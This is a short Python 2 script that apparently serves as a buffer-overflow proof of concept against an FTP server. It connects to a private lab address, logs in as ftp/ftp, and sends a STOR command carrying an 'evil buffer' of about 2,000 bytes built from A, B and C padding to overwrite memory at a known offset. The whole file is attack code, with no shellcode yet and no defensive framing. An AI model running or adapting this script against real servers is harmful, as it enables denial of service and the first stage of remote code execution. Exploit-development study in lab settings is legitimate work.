#!/usr/bin/python
import socket
import ftplib
from ftplib import FTP
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" *966 + "B" *4 + "C" *1000

print "\nSending evil buffer..."
s.connect(('172.16.73.129',21))
data = s.recv(1023)
s.send('USER ftp\r\n')
data = s.recv(1024)
s.send('PASS ftp\r\n')
data = s.recv(1024)
s.send('STOR ' + buffer + '\r\n')
s.close()
